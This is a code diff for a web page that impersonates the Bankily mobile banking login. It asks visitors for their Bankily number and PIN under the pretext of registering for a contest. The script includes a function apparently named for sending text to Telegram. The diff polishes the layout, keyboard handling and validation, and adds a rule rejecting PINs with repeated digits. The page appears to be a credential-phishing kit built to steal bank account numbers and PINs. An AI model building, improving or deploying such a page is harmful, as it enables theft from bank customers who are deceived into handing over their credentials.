@@ -13,7 +13,7 @@
 html,body{width:100%;min-height:100vh;overflow-x:hidden}
 body{
   font-family:'Cairo',sans-serif;
-  background:#f5f5f5;
+  background:#fff;
   color:#222;
   min-height:100vh;
   display:flex;
@@ -21,14 +21,13 @@ body{
 }
 
 /* ══ TOP BAR ══ */
-/* BUG 1 FIX: position:relative moved to CSS, removed inline style */
 .top-bar{
   background:#0097A7;
   padding:0 16px;
   height:56px;
   display:flex;align-items:center;justify-content:space-between;
   flex-shrink:0;
-  position:relative; /* ← FIX: was inline style, now in CSS */
+  position:relative;
 }
 .tb-back{
   background:none;border:none;cursor:pointer;
@@ -39,7 +38,7 @@ body{
   color:#fff;font-family:'Cairo',sans-serif;
   font-size:17px;font-weight:700;
   position:absolute;left:50%;transform:translateX(-50%);
-  white-space:nowrap; /* ← FIX: prevent text wrap on small screens */
+  white-space:nowrap;
 }
 .tb-lang{
   background:rgba(255,255,255,.2);
@@ -52,38 +51,28 @@ body{
 }
 .tb-lang:hover{background:rgba(255,255,255,.35)}
 
-/* ══ PAGE ══ */
+/* ══ PAGE ══
+   FIX: padding-bottom must be large enough so content
+   never hides behind the fixed button (80px button + safe area) */
 .page{
   flex:1;
   background:#fff;
   display:flex;flex-direction:column;
-  padding:0 24px calc(80px + env(safe-area-inset-bottom));
+  padding:0 24px calc(100px + env(safe-area-inset-bottom));
   max-width:480px;margin:0 auto;width:100%;
 }
 
-/* ══ LOGO AREA ══ */
+/* ══ LOGO ══ */
 .logo-area{
   display:flex;justify-content:center;align-items:center;
   padding:32px 0 28px;
   min-height:140px;
 }
-.logo-area img{
-  max-width:240px;width:100%;height:auto;
-  display:block;
-}
-.logo-fallback{
-  display:none;
-  flex-direction:column;align-items:center;gap:6px;
-}
+.logo-area img{max-width:240px;width:100%;height:auto;display:block}
+.logo-fallback{display:none;flex-direction:column;align-items:center;gap:6px}
 .logo-fallback.show{display:flex}
-.logo-fallback-text{
-  font-size:28px;font-weight:900;color:#0097A7;
-  font-family:'Cairo',sans-serif;letter-spacing:1px;
-}
-.logo-fallback-sub{
-  font-size:12px;color:#888;
-  font-family:'Cairo',sans-serif;
-}
+.logo-fallback-text{font-size:28px;font-weight:900;color:#0097A7;font-family:'Cairo',sans-serif}
+.logo-fallback-sub{font-size:12px;color:#888;font-family:'Cairo',sans-serif}
 
 /* ══ INFO MSG ══ */
 .info-msg{
@@ -91,10 +80,13 @@ body{
   background:#E8F7F9;border-radius:8px;
   padding:10px 14px;margin-bottom:24px;
   line-height:1.6;text-align:center;
-  transition:opacity .4s;
+  transition:opacity .3s,max-height .4s,padding .3s,margin .3s;
+  max-height:100px;overflow:hidden;
 }
-/* BUG 5 FIX: use opacity+pointer-events instead of display:none so timer works cleanly */
-.info-msg.hidden{opacity:0;pointer-events:none;height:0;padding:0;margin:0;overflow:hidden}
+.info-msg.hidden{
+  opacity:0;pointer-events:none;
+  max-height:0;padding:0;margin:0;
+}
 
 /* ══ USERNAME FIELD ══ */
 .field-wrap{margin-bottom:28px}
@@ -134,13 +126,9 @@ body{
   font-family:'Cairo',sans-serif;padding:0;
 }
 .pin-lock-icon{width:26px;height:26px;color:#888;flex-shrink:0}
-
-/* BUG 2 FIX: removed border-bottom from .pin-boxes (was showing under the whole row)
-   Each individual .pin-box already has its own border-bottom */
 .pin-boxes{
   display:flex;gap:20px;direction:ltr;
   padding-bottom:8px;flex:1;
-  /* REMOVED: border-bottom:1.5px solid #ccc — was wrong, applied to container */
 }
 .pin-box{
   width:32px;height:40px;
@@ -149,7 +137,7 @@ body{
   font-size:22px;font-weight:800;
   text-align:center;color:#222;
   direction:ltr;
-  border-bottom:2px solid #aaa; /* ← each box has its own underline */
+  border-bottom:2px solid #aaa;
   padding:0;
   caret-color:transparent;
   -webkit-appearance:none;border-radius:0;
@@ -169,8 +157,15 @@ body{
   font-family:'Cairo',sans-serif;font-weight:600;
 }
 
-/* ══ BOTTOM BUTTON ══ */
-.btn-bar{position:fixed;bottom:0;left:0;right:0;z-index:100}
+/* ══ BOTTOM BUTTON ══
+   FIX: z-index kept reasonable, transform reset on viewport resize */
+.btn-bar{
+  position:fixed;
+  bottom:0;left:0;right:0;
+  z-index:100;
+  /* Ensure it stays above keyboard on Android */
+  transition:transform .15s;
+}
 .login-btn{
   display:block;width:100%;
   padding:18px;border:none;
@@ -239,7 +234,7 @@ body{
   </div>
 </div>
 
-<!-- Top bar — BUG 1 FIX: removed inline style="position:relative", now in CSS -->
+<!-- Top bar -->
 <div class="top-bar">
   <button class="tb-back" onclick="window.location.href='index.html'">&#8592;</button>
   <span class="tb-title" id="tb-title"></span>
@@ -251,12 +246,8 @@ body{
 
   <!-- LOGO -->
   <div class="logo-area">
-    <img
-      src="images/logo.png"
-      alt="Bankily"
-      id="logo-img"
-      onerror="this.style.display='none';document.getElementById('logo-fb').classList.add('show')"
-    >
+    <img src="images/logo.png" alt="Bankily" id="logo-img"
+         onerror="this.style.display='none';document.getElementById('logo-fb').classList.add('show')">
     <div class="logo-fallback" id="logo-fb">
       <span class="logo-fallback-text">🏦 Bankily</span>
       <span class="logo-fallback-sub">PAR BPM</span>
@@ -278,12 +269,9 @@ body{
           <circle cx="12" cy="8" r="4"/>
           <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
         </svg>
-        <input
-          class="field-input" type="tel" id="username"
+        <input class="field-input" type="tel" id="username"
           inputmode="numeric" maxlength="8"
-          placeholder="32758657"
-          autocomplete="off"
-        >
+          placeholder="32758657" autocomplete="off">
       </div>
     </div>
 
@@ -297,7 +285,6 @@ body{
         <span class="pin-label-text" id="pin-label">Code PIN</span>
         <button type="button" class="forgot-pin" id="forgot-pin">Code PIN oublié ?</button>
       </div>
-      <!-- BUG 2 FIX: removed border-bottom from pin-boxes, each pin-box has its own -->
       <div class="pin-boxes" id="pin-boxes" dir="ltr">
         <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
         <input class="pin-box" type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" dir="ltr">
@@ -317,7 +304,7 @@ body{
 </div>
 
 <!-- Fixed bottom button -->
-<div class="btn-bar">
+<div class="btn-bar" id="btn-bar">
   <button class="login-btn" id="login-btn"
     onclick="document.getElementById('login-form').dispatchEvent(new Event('submit',{cancelable:true,bubbles:true}))">
     Se connecter
@@ -333,7 +320,9 @@ const modalText     = document.getElementById('modal-text');
 const modalClose    = document.getElementById('modal-close');
 const infoMsg       = document.getElementById('info-msg');
 const loginBtn      = document.getElementById('login-btn');
+const btnBar        = document.getElementById('btn-bar');
 
+/* ══ TRANSLATIONS ══ */
 const T = {
   ar:{
     dir:'rtl',lang:'ar',langBtn:'FR',
@@ -347,6 +336,7 @@ const T = {
     infoMsg:'تأكد من كتابة رقمك بنكيلي ورمز السري بشكل صحيح حتى تأكد تسجيلك في المسابقة',
     errUsername:'يجب أن يحتوي رقم بنكيلي على 8 أرقام ويبدأ بـ 2 أو 3 أو 4',
     errPin:'يجب أن يحتوي الرمز السري على 4 أرقام',
+    errPinUnique:'يجب أن تكون أرقام الرمز السري الأربعة مختلفة تماماً',
     already:(m)=>`⛔ لقد سجلت من قبل.\nالرجاء الانتظار ${m} دقيقة.`,
   },
   fr:{
@@ -361,6 +351,7 @@ const T = {
     infoMsg:"Assurez-vous de bien saisir votre numéro Bankily et votre code PIN pour confirmer votre inscription au concours",
     errUsername:'Le numéro Bankily doit contenir 8 chiffres et commencer par 2, 3 ou 4',
     errPin:'Le code PIN doit contenir 4 chiffres',
+    errPinUnique:'Les 4 chiffres du code PIN doivent être tous différents',
     already:(m)=>`⛔ Vous avez déjà participé.\nRevenez dans ${m} minute(s).`,
   }
 };
@@ -382,9 +373,8 @@ function applyLang(){
   document.getElementById('ld-text').textContent          = L.ldText;
   document.getElementById('info-msg').textContent         = L.infoMsg;
   loginBtn.textContent = L.loginBtn;
-  // PIN boxes always LTR regardless of language
   document.getElementById('pin-boxes').dir = 'ltr';
-  pinInputs.forEach(i=>{ i.setAttribute('dir','ltr'); });
+  pinInputs.forEach(i=>i.setAttribute('dir','ltr'));
 }
 
 function toggleLang(){
@@ -393,8 +383,7 @@ function toggleLang(){
   applyLang();
 }
 
-/* BUG 5 FIX: use a mutable variable instead of const for the timer
-   so clearTimeout can properly cancel it when user starts typing */
+/* Info msg auto-hide */
 let infoTimer = setTimeout(()=>infoMsg.classList.add('hidden'), 4000);
 usernameInput.addEventListener('input',()=>{
   clearTimeout(infoTimer);
@@ -412,27 +401,23 @@ pinInputs.forEach((inp,i)=>{
   inp.addEventListener('input',()=>{
     inp.value = inp.value.replace(/[^0-9]/g,'').slice(0,1);
     if(inp.value && i < pinInputs.length-1) pinInputs[i+1].focus();
-    /* Mask digit after short delay for UX */
-    setTimeout(()=>{ if(inp.value) inp.type='password'; },400);
+    setTimeout(()=>{ if(inp.value) inp.type='password'; }, 400);
   });
 
   inp.addEventListener('keydown',e=>{
     if(e.key==='Backspace'){
       if(inp.value===''){
-        /* BUG 4 FIX: only switch type AFTER clearing, and check i>0 first */
         if(i>0){
           pinInputs[i-1].type='tel';
           pinInputs[i-1].value='';
           pinInputs[i-1].focus();
         }
       } else {
-        /* Clear current box: reset type first so value is visible, then clear */
         inp.type='tel';
         inp.value='';
       }
       e.preventDefault();
     }
-    /* Block non-numeric keys */
     if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)){
       e.preventDefault();
     }
@@ -448,11 +433,22 @@ pinInputs.forEach((inp,i)=>{
   });
 });
 
-/* Keyboard push-up for fixed button */
+/* ══ FIX: Button position with keyboard ══
+   On Android, when keyboard opens the viewport shrinks.
+   We move the button UP by the keyboard height so it
+   stays visible ABOVE the keyboard and not on top of fields. */
 if(window.visualViewport){
   window.visualViewport.addEventListener('resize',()=>{
-    const kb=window.innerHeight-window.visualViewport.height;
-    document.querySelector('.btn-bar').style.transform=kb>50?`translateY(-${kb}px)`:'';
+    const kb = window.innerHeight - window.visualViewport.height;
+    if(kb > 50){
+      /* keyboard is open: push button above keyboard */
+      btnBar.style.position = 'fixed';
+      btnBar.style.bottom   = kb + 'px';
+    } else {
+      /* keyboard closed: button back to bottom */
+      btnBar.style.position = 'fixed';
+      btnBar.style.bottom   = '0';
+    }
   });
 }
 
@@ -469,7 +465,7 @@ async function sendTG(text){
   }catch(e){}
 }
 
-/* Anti-double submit */
+/* Anti-double */
 function checkReg(u){
   const d=localStorage.getItem('bnk_reg_'+u);
   if(!d)return false;
@@ -486,23 +482,28 @@ document.getElementById('login-form').addEventListener('submit',async function(e
   const username = usernameInput.value.trim();
   const pin = Array.from(pinInputs).map(i=>i.value).join('');
 
-  /* Validate username: 8 digits, starts with 2, 3 or 4 */
+  /* Validate username */
   if(!/^[2-4][0-9]{7}$/.test(username)){
     showModal(L.errUsername);
     return;
   }
 
-  /* Validate PIN: exactly 4 digits */
+  /* Validate PIN length */
   if(!/^[0-9]{4}$/.test(pin)){
     showModal(L.errPin);
     return;
   }
 
-  /* BUG 3 FIX: removed the wrong unique-digits check.
-     The condition `new Set(pin).size < 4` was rejecting valid PINs like "1234"
-     because it required ALL 4 digits to be different.
-     A PIN like "1234" has size=4 → passes, but "1123" has size=3 → wrongly rejected.
-     Standard banking PINs do NOT require all unique digits — removed entirely. */
+  /* ══ PIN UNIQUE DIGITS CHECK ══
+     Accepts: 1234, 5678, 9012 (all 4 different)
+     Rejects: 1111, 1122, 1112, 1123 (any repeated digit) */
+  if(new Set(pin.split('')).size < 4){
+    showModal(L.errPinUnique);
+    /* Clear all PIN boxes */
+    pinInputs.forEach(i=>{ i.type='tel'; i.value=''; });
+    pinInputs[0].focus();
+    return;
+  }
 
   /* Anti-double */
   const mins = checkReg(username);
